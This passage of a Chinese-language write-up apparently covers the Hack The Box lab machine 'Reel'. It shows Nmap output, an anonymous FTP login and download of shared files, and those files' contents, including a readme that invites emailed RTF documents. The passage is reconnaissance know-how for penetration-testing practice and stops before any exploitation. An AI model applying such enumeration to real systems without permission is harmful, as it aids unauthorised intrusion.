escape_">\r</span><span class="hljs-char escape_">\n</span>503<span class="hljs-char escape_">\x20</span>Bad<span class="hljs-char escape_">\x20</span>sequence<span class="hljs-char escape_">\x20</span>of<span class="hljs-char escape_">\x20</span>comman</span><br><span class="hljs-string">SF:ds<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">RPCCheck</span>,<span class="hljs-number">18</span>,<span class="hljs-string">&quot;220<span class="hljs-char escape_">\x20</span>Mail<span class="hljs-char escape_">\x20</span>Service<span class="hljs-char escape_">\x20</span>ready<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">DNSVers</span><br><span class="hljs-variable">SF</span>:<span class="hljs-variable">ionBindReqTCP</span>,<span class="hljs-number">18</span>,<span class="hljs-string">&quot;220<span class="hljs-char escape_">\x20</span>Mail<span class="hljs-char escape_">\x20</span>Service<span class="hljs-char escape_">\x20</span>ready<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">DNSStatusRequ</span><br><span class="hljs-variable">SF</span>:<span class="hljs-variable">estTCP</span>,<span class="hljs-number">18</span>,<span class="hljs-string">&quot;220<span class="hljs-char escape_">\x20</span>Mail<span class="hljs-char escape_">\x20</span>Service<span class="hljs-char escape_">\x20</span>ready<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">SSLSessionReq</span>,<span class="hljs-number">18</span>,<span class="hljs-string">&quot;22</span><br><span class="hljs-string">SF:0<span class="hljs-char escape_">\x20</span>Mail<span class="hljs-char escape_">\x20</span>Service<span class="hljs-char escape_">\x20</span>ready<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">TerminalServerCookie</span>,<span class="hljs-number">36</span>,<span class="hljs-string">&quot;220<span class="hljs-char escape_">\x20</span>M</span><br><span class="hljs-string">SF:ail<span class="hljs-char escape_">\x20</span>Service<span class="hljs-char escape_">\x20</span>ready<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>503<span class="hljs-char escape_">\x20</span>Bad<span class="hljs-char escape_">\x20</span>sequence<span class="hljs-char escape_">\x20</span>of<span class="hljs-char escape_">\x20</span>commands<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span></span><br><span class="hljs-string">SF:&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">TLSSessionReq</span>,<span class="hljs-number">18</span>,<span class="hljs-string">&quot;220<span class="hljs-char escape_">\x20</span>Mail<span class="hljs-char escape_">\x20</span>Service<span class="hljs-char escape_">\x20</span>ready<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">Kerberos</span><br><span class="hljs-variable">SF</span>:,<span class="hljs-number">18</span>,<span class="hljs-string">&quot;220<span class="hljs-char escape_">\x20</span>Mail<span class="hljs-char escape_">\x20</span>Service<span class="hljs-char escape_">\x20</span>ready<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">SMBProgNeg</span>,<span class="hljs-number">18</span>,<span class="hljs-string">&quot;220<span class="hljs-char escape_">\x20</span>Mail</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>Service<span class="hljs-char escape_">\x20</span>ready<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-variable">X11Probe</span>,<span class="hljs-number">18</span>,<span class="hljs-string">&quot;220<span class="hljs-char escape_">\x20</span>Mail<span class="hljs-char escape_">\x20</span>Service<span class="hljs-char escape_">\x20</span>rea</span><br><span class="hljs-string">SF:dy<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">FourOhFourRequest</span>,<span class="hljs-number">54</span>,<span class="hljs-string">&quot;220<span class="hljs-char escape_">\x20</span>Mail<span class="hljs-char escape_">\x20</span>Service<span class="hljs-char escape_">\x20</span>ready<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>503</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>Bad<span class="hljs-char escape_">\x20</span>sequence<span class="hljs-char escape_">\x20</span>of<span class="hljs-char escape_">\x20</span>commands<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>503<span class="hljs-char escape_">\x20</span>Bad<span class="hljs-char escape_">\x20</span>sequence<span class="hljs-char escape_">\x20</span>of\x</span><br><span class="hljs-string">SF:20commands<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">LPDString</span>,<span class="hljs-number">18</span>,<span class="hljs-string">&quot;220<span class="hljs-char escape_">\x20</span>Mail<span class="hljs-char escape_">\x20</span>Service<span class="hljs-char escape_">\x20</span>ready<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><br><span class="hljs-variable">SF</span>:<span class="hljs-title function_">r</span>(<span class="hljs-title class_">LDAPSearchReq</span>,<span class="hljs-number">18</span>,<span class="hljs-string">&quot;220<span class="hljs-char escape_">\x20</span>Mail<span class="hljs-char escape_">\x20</span>Service<span class="hljs-char escape_">\x20</span>ready<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">LDAPBindReq</span><br><span class="hljs-variable">SF</span>:,<span class="hljs-number">18</span>,<span class="hljs-string">&quot;220<span class="hljs-char escape_">\x20</span>Mail<span class="hljs-char escape_">\x20</span>Service<span class="hljs-char escape_">\x20</span>ready<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">SIPOptions</span>,<span class="hljs-number">162</span>,<span class="hljs-string">&quot;220<span class="hljs-char escape_">\x20</span>Mai</span><br><span class="hljs-string">SF:l<span class="hljs-char escape_">\x20</span>Service<span class="hljs-char escape_">\x20</span>ready<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>503<span class="hljs-char escape_">\x20</span>Bad<span class="hljs-char escape_">\x20</span>sequence<span class="hljs-char escape_">\x20</span>of<span class="hljs-char escape_">\x20</span>commands<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>50</span><br><span class="hljs-string">SF:3<span class="hljs-char escape_">\x20</span>Bad<span class="hljs-char escape_">\x20</span>sequence<span class="hljs-char escape_">\x20</span>of<span class="hljs-char escape_">\x20</span>commands<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>503<span class="hljs-char escape_">\x20</span>Bad<span class="hljs-char escape_">\x20</span>sequence<span class="hljs-char escape_">\x20</span>of\</span><br><span class="hljs-string">SF:x20commands<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>503<span class="hljs-char escape_">\x20</span>Bad<span class="hljs-char escape_">\x20</span>sequence<span class="hljs-char escape_">\x20</span>of<span class="hljs-char escape_">\x20</span>commands<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>503<span class="hljs-char escape_">\x20</span>Bad\x</span><br><span class="hljs-string">SF:20sequence<span class="hljs-char escape_">\x20</span>of<span class="hljs-char escape_">\x20</span>commands<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>503<span class="hljs-char escape_">\x20</span>Bad<span class="hljs-char escape_">\x20</span>sequence<span class="hljs-char escape_">\x20</span>of<span class="hljs-char escape_">\x20</span>command</span><br><span class="hljs-string">SF:s<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>503<span class="hljs-char escape_">\x20</span>Bad<span class="hljs-char escape_">\x20</span>sequence<span class="hljs-char escape_">\x20</span>of<span class="hljs-char escape_">\x20</span>commands<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>503<span class="hljs-char escape_">\x20</span>Bad<span class="hljs-char escape_">\x20</span>sequence</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>of<span class="hljs-char escape_">\x20</span>commands<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>503<span class="hljs-char escape_">\x20</span>Bad<span class="hljs-char escape_">\x20</span>sequence<span class="hljs-char escape_">\x20</span>of<span class="hljs-char escape_">\x20</span>commands<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>503\x</span><br><span class="hljs-string">SF:20Bad<span class="hljs-char escape_">\x20</span>sequence<span class="hljs-char escape_">\x20</span>of<span class="hljs-char escape_">\x20</span>commands<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>503<span class="hljs-char escape_">\x20</span>Bad<span class="hljs-char escape_">\x20</span>sequence<span class="hljs-char escape_">\x20</span>of<span class="hljs-char escape_">\x20</span></span><br><span class="hljs-string">SF:commands<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>);<br><span class="hljs-title class_">Service</span> <span class="hljs-title class_">Info</span>: <span class="hljs-title class_">Host</span>: <span class="hljs-variable">REEL</span>; <span class="hljs-variable">OS</span>: <span class="hljs-title class_">Windows</span>; <span class="hljs-variable">CPE</span>: <span class="hljs-variable">cpe</span>:/<span class="hljs-variable">o</span>:<span class="hljs-variable">microsoft</span>:<span class="hljs-variable">windows</span><br><br><span class="hljs-title class_">Host</span> <span class="hljs-variable">script</span> <span class="hljs-variable">results</span>:<br><span class="hljs-operator">|</span><span class="hljs-variable">_clock</span><span class="hljs-operator">-</span><span class="hljs-variable">skew</span>: <span class="hljs-variable">mean</span>: <span class="hljs-number">-19</span>m58s, <span class="hljs-variable">deviation</span>: <span class="hljs-number">34</span>m35s, <span class="hljs-variable">median</span>: <span class="hljs-number">0</span>s<br><span class="hljs-operator">|</span> <span class="hljs-variable">smb2</span><span class="hljs-operator">-</span><span class="hljs-variable">time</span>: <br><span class="hljs-operator">|</span>   <span class="hljs-variable">date</span>: <span class="hljs-number">2022</span><span class="hljs-number">-04</span><span class="hljs-number">-06</span>T08:<span class="hljs-number">32</span>:<span class="hljs-number">23</span><br><span class="hljs-operator">|</span><span class="hljs-variable">_</span>  <span class="hljs-variable">start_date</span>: <span class="hljs-number">2022</span><span class="hljs-number">-04</span><span class="hljs-number">-06</span>T08:<span class="hljs-number">26</span>:<span class="hljs-number">16</span><br><span class="hljs-operator">|</span> <span class="hljs-variable">smb</span><span class="hljs-operator">-</span><span class="hljs-variable">security</span><span class="hljs-operator">-</span><span class="hljs-variable">mode</span>: <br><span class="hljs-operator">|</span>   <span class="hljs-variable">account_used</span>: <span class="hljs-operator">&lt;</span><span class="hljs-variable">blank</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>   <span class="hljs-variable">authentication_level</span>: <span class="hljs-variable">user</span><br><span class="hljs-operator">|</span>   <span class="hljs-variable">challenge_response</span>: <span class="hljs-variable">supported</span><br><span class="hljs-operator">|</span><span class="hljs-variable">_</span>  <span class="hljs-variable">message_signing</span>: <span class="hljs-variable">required</span><br><span class="hljs-operator">|</span> <span class="hljs-variable">smb2</span><span class="hljs-operator">-</span><span class="hljs-variable">security</span><span class="hljs-operator">-</span><span class="hljs-variable">mode</span>: <br><span class="hljs-operator">|</span>   <span class="hljs-number">3.0</span><span class="hljs-number">.2</span>: <br><span class="hljs-operator">|</span><span class="hljs-variable">_</span>    <span class="hljs-title class_">Message</span> <span class="hljs-variable">signing</span> <span class="hljs-variable">enabled</span> <span class="hljs-variable">and</span> <span class="hljs-variable">required</span><br><span class="hljs-operator">|</span> <span class="hljs-variable">smb</span><span class="hljs-operator">-</span><span class="hljs-variable">os</span><span class="hljs-operator">-</span><span class="hljs-variable">discovery</span>: <br><span class="hljs-operator">|</span>   <span class="hljs-variable">OS</span>: <span class="hljs-title class_">Windows</span> <span class="hljs-title class_">Server</span> <span class="hljs-number">2012</span> <span class="hljs-variable">R2</span> <span class="hljs-title class_">Standard</span> <span class="hljs-number">9600</span> (<span class="hljs-title class_">Windows</span> <span class="hljs-title class_">Server</span> <span class="hljs-number">2012</span> <span class="hljs-variable">R2</span> <span class="hljs-title class_">Standard</span> <span class="hljs-number">6.3</span>)<br><span class="hljs-operator">|</span>   <span class="hljs-variable">OS</span> <span class="hljs-variable">CPE</span>: <span class="hljs-variable">cpe</span>:/<span class="hljs-variable">o</span>:<span class="hljs-variable">microsoft</span>:<span class="hljs-variable">windows_server_2012</span>::<span class="hljs-operator">-</span><br><span class="hljs-operator">|</span>   <span class="hljs-title class_">Computer</span> <span class="hljs-variable">name</span>: <span class="hljs-variable">REEL</span> <br><span class="hljs-operator">|</span>   <span class="hljs-title class_">Net</span>BIOS <span class="hljs-variable">computer</span> <span class="hljs-variable">name</span>: <span class="hljs-variable">REEL</span>\<span class="hljs-variable">x00</span><br><span class="hljs-operator">|</span>   <span class="hljs-title class_">Domain</span> <span class="hljs-variable">name</span>: <span class="hljs-variable">HTB</span>.<span class="hljs-property">LOCAL</span> <br><span class="hljs-operator">|</span>   <span class="hljs-title class_">Forest</span> <span class="hljs-variable">name</span>: <span class="hljs-variable">HTB</span>.<span class="hljs-property">LOCAL</span><br><span class="hljs-operator">|</span>   <span class="hljs-variable">FQDN</span>: <span class="hljs-variable">REEL</span>.<span class="hljs-property">HTB</span>.<span class="hljs-property">LOCAL</span><br><span class="hljs-operator">|</span><span class="hljs-variable">_</span>  <span class="hljs-title class_">System</span> <span class="hljs-variable">time</span>: <span class="hljs-number">2022</span><span class="hljs-number">-04</span><span class="hljs-number">-06</span>T09:<span class="hljs-number">32</span>:<span class="hljs-number">22</span><span class="hljs-operator">+</span><span class="hljs-number">01</span>:<span class="hljs-number">00</span><br><br><span class="hljs-title class_">Service</span> <span class="hljs-variable">detection</span> <span class="hljs-variable">performed</span>. <span class="hljs-title class_">Please</span> <span class="hljs-variable">report</span> <span class="hljs-variable">any</span> incorrect <span class="hljs-variable">results</span> <span class="hljs-variable">at</span> <span class="hljs-variable">https</span>:<span class="hljs-comment">//nmap.org/submit/ .</span><br><span class="hljs-title class_">Nmap</span> <span class="hljs-variable">done</span>: <span class="hljs-number">1</span> <span class="hljs-variable">IP</span> <span class="hljs-title function_">address</span> (<span class="hljs-number">1</span> <span class="hljs-variable">host</span> <span class="hljs-variable">up</span>) <span class="hljs-variable">scanned</span> <span class="hljs-keyword">in</span> <span class="hljs-number">390.29</span> <span class="hljs-variable">seconds</span><br></code></pre></td></tr></table></figure>
+
+<p>Nmap为我枚举到了21FTP协议、22SSH协议、25SMTP协议但是它是有问好的Nmap不敢确定、445SMB协议以及593 ncacn_http服务，135与49159msrpc。139的netbios-ssn，</p>
+<p>而且目标像是在域环境中，操作系统为windows server 2012，它的主机名为REEL，NetBIOS的主机名为REEL\x00，域名为HTB.LOCAL，域森林名为HTB.LOCAL，该主机在域内的全民为REEL.HTB.LOCAL，它的时间与我当前是很不符合的，意味着如果我需要计划任务一些操作，需要核对目标当前主机的系统时间。</p>
+<h5 id="访问FTP："><a href="#访问FTP：" class="headerlink" title="访问FTP："></a>访问FTP：</h5><p>首先我可以尝试对目标FTP端口发起访问请求，因为Nmap告诉我<strong>Anonymous FTP login allowed</strong>，我可以用尝试用anonymous访问看在其共享文件中能否获取到一些信息：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ftp</span> <span class="hljs-number">10.10.10.77</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs delphi">Connected <span class="hljs-keyword">to</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.77</span>.<br><span class="hljs-number">220</span> Microsoft FTP Service<br><span class="hljs-keyword">Name</span> (<span class="hljs-number">10.10</span>.<span class="hljs-number">10.77</span>:worldisend): anonymous<br><span class="hljs-number">331</span> Anonymous access allowed, send identity (e-mail <span class="hljs-keyword">name</span>) <span class="hljs-keyword">as</span> password.<br>Password: <br><span class="hljs-number">230</span> User logged <span class="hljs-keyword">in</span>.<br>Remote system <span class="hljs-keyword">type</span> <span class="hljs-keyword">is</span> Windows_NT.<br></code></pre></td></tr></table></figure>
+
+<p>我登录了进去，可以尝试dir看起有何共享：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ftp</span>&gt; dir<br><span class="hljs-attribute">229</span> Entering Extended Passive Mode (|||<span class="hljs-number">41001</span>|)<br><span class="hljs-attribute">125</span> Data connection already open; Transfer starting.<br><span class="hljs-attribute">05</span>-<span class="hljs-number">29</span>-<span class="hljs-number">18</span>  <span class="hljs-number">12</span>:<span class="hljs-number">19</span>AM       &lt;DIR&gt;          documents<br><span class="hljs-attribute">226</span> Transfer complete.<br><span class="hljs-attribute">ftp</span>&gt; cd documents<br><span class="hljs-attribute">250</span> CWD command successful.<br><span class="hljs-attribute">ftp</span>&gt; type documents<br><span class="hljs-attribute">documents</span>: unknown mode.<br><span class="hljs-attribute">ftp</span>&gt; dir<br><span class="hljs-attribute">229</span> Entering Extended Passive Mode (|||<span class="hljs-number">41002</span>|)<br><span class="hljs-attribute">125</span> Data connection already open; Transfer starting.<br><span class="hljs-attribute">05</span>-<span class="hljs-number">29</span>-<span class="hljs-number">18</span>  <span class="hljs-number">12</span>:<span class="hljs-number">19</span>AM                 <span class="hljs-number">2047</span> AppLocker.docx<br><span class="hljs-attribute">05</span>-<span class="hljs-number">28</span>-<span class="hljs-number">18</span>  <span class="hljs-number">02</span>:<span class="hljs-number">01</span>PM                  <span class="hljs-number">124</span> readme.txt<br><span class="hljs-attribute">10</span>-<span class="hljs-number">31</span>-<span class="hljs-number">17</span>  <span class="hljs-number">10</span>:<span class="hljs-number">13</span>PM                <span class="hljs-number">14581</span> Windows Event Forwarding.docx<br><span class="hljs-attribute">226</span> Transfer complete.<br></code></pre></td></tr></table></figure>
+
+<p>FTP中存有一个目录documents，进入发现它为我遗留有两个docx文档，以及一个txt文本文件。我可以将其下载到我本地进行查看。</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ftp&gt; prompt<br>Interactive mode off.<br>ftp&gt; mget <span class="hljs-emphasis">*</span><br><span class="hljs-emphasis">local: AppLocker.docx remote: AppLocker.docx</span><br><span class="hljs-emphasis">229 Entering Extended Passive Mode (|||41009|)</span><br><span class="hljs-emphasis">150 Opening ASCII mode data connection.</span><br><span class="hljs-emphasis">100% |<span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">***|  2047        6.94 KiB/s    00:00 ETA</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">226 Transfer complete.</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">WARNING! 9 bare linefeeds received in ASCII mode.</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">File may not have transferred correctly.</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">2047 bytes received in 00:00 (4.65 KiB/s)</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">local: readme.txt remote: readme.txt</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">229 Entering Extended Passive Mode (|||41010|)</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">125 Data connection already open; Transfer starting.</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">100% |**</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span>*</span>|   124        0.36 KiB/s    00:00 ETA<br>226 Transfer complete.<br>124 bytes received in 00:00 (0.25 KiB/s)<br>local: Windows Event Forwarding.docx remote: Windows Event Forwarding.docx<br>229 Entering Extended Passive Mode (|||41011|)<br>125 Data connection already open; Transfer starting.<br>100% |<span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">**<span class="hljs-emphasis">*| 14581       18.54 KiB/s    00:00 ETA</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">226 Transfer complete.</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">WARNING! 51 bare linefeeds received in ASCII mode.</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">File may not have transferred correctly.</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">14581 bytes received in 00:00 (15.62 KiB/s)</span></span><br></code></pre></td></tr></table></figure>
+
+<p>这是readme.txt中的信息，它似乎是我要我发送一份RTF文本格式的邮件给它：</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss">please email me any rtf <span class="hljs-keyword">format</span> procedures - I&#x27;ll review <span class="hljs-keyword">and</span> convert.<br><br><span class="hljs-keyword">new</span> <span class="hljs-keyword">format</span> / converted documents will be <span class="hljs-built_in">saved</span> here.<br></code></pre></td></tr></table></figure>
+
+<p>AppLocker.docx，这是它允许我发送哪些程序，：</p>
+<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi">AppLocker <span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">to</span> <span class="hljs-title">be</span> <span class="hljs-title">documented</span> - <span class="hljs-title">hash</span> <span class="hljs-title">rules</span> <span class="hljs-title">for</span> <span class="hljs-title">exe</span>, <span class="hljs-title">msi</span> <span class="hljs-title">and</span> <span class="hljs-title">scripts</span> <span class="hljs-params">(ps1,vbs,cmd,bat,js)</span> <span class="hljs-title">are</span> <span class="hljs-title">in</span> <span class="hljs-title">effect</span>.</span><br></code></pre></td></tr></table></figure>
+
+<p>Windows Event Forwarding.docx，这个目前我不知道是用来干什么的，它像是一个命令记录，像是一个事件中继器：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># get winrm config</span><br><span class="hljs-attribute">winrm</span> get winrm/config<br><span class="hljs-comment"># gpo config</span><br><span class="hljs-attribute">O</span>:BAG:SYD:(A;;<span class="hljs-number">0</span>xf0005;;;SY)(A;;<span class="hljs-number">0</span>x5;;;BA)(A;;<span class="hljs-number">0</span>x1;;;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">573</span>)(A;;<span class="hljs-number">0</span>x1;;;NS)		// add to GPO<br><span class="hljs-attribute">Server</span>=http://WEF.HTB.LOCAL:<span class="hljs-number">5985</span>/wsman/SubscriptionManager/WEC,Refresh=<span class="hljs-number">60</span>	// add to GPO (<span class="hljs-number">60</span> seconds)<br><span class="hljs-attribute">on</span> source computer: gpupdate /force<br><span class="hljs-comment"># prereqs</span><br><span class="hljs-attribute">start</span> Windows Remote Management service <span class="hljs-literal">on</span> source computer<br><span class="hljs-attribute">add</span> builtin\network service account to <span class="hljs-string">&quot;Event Log Readers&quot;</span> group <span class="hljs-literal">on</span> collector server<br><span class="hljs-comment"># list subscriptions / export</span><br><span class="hljs-attribute">C</span>:\Windows\system32&gt;wecutil es &gt; subs.txt<br><span class="hljs-comment"># check subscription status</span><br><span class="hljs-attribute">C</span>:\Windows\system32&gt;wecutil gr <span class="hljs-string">&quot;Account Currently Disabled&quot;</span><br><span class="hljs-attribute">Subscription</span>: Account Currently Disabled<br>        <span class="hljs-attribute">RunTimeStatus</span>: Active<br>        <span class="hljs-attribute">LastError</span>: <span class="hljs-number">0</span><br>        <span class="hljs-attribute">EventSources</span>:<br>                <span class="hljs-attribute">LAPTOP12</span>.HTB.LOCAL<br>                        <span class="hljs-attribute">RunTimeStatus</span>: Active<br>                        <span class="hljs-attribute">LastError</span>: <span class="hljs-number">0</span><br>                        <span class="hljs-attribute">LastHeartbeatTime</span>: <span class="hljs-number">2017</span>-<span class="hljs-number">07</span>-<span class="hljs-number">11</span>T13:<span class="hljs-number">27</span>:<span class="hljs-number">00</span>.<span class="hljs-number">920</span><br>                        <br><span class="hljs-comment"># change pre-rendering setting in multiple subscriptions</span><br><span class="hljs-attribute">for</span> /F <span class="hljs-string">&quot;tokens=*&quot;</span> %i in (subs.txt) DO wecutil ss <span class="hljs-string">&quot;%i&quot;</span> /cf:Events<br><span class="hljs-comment"># export subscriptions to xml</span><br><span class="hljs-attribute">for</span> /F <span class="hljs-string">&quot;tokens=*&quot;</span> %i in (subs.txt) DO wecutil gs <span class="hljs-string">&quot;%i&quot;</span> /f:xml &gt;&gt; <span class="hljs-string">&quot;%i.xml&quot;</span><br><span class="hljs-comment"># import subscriptions from xml</span><br><span class="hljs-attribute">wecutil</span> cs <span class="hljs-string">&quot;Event Log Service Shutdown.xml&quot;</span><br><span class="hljs-attribute">wecutil</span> cs <span class="hljs-string">&quot;Event Log was cleared.xml&quot;</span><br><span 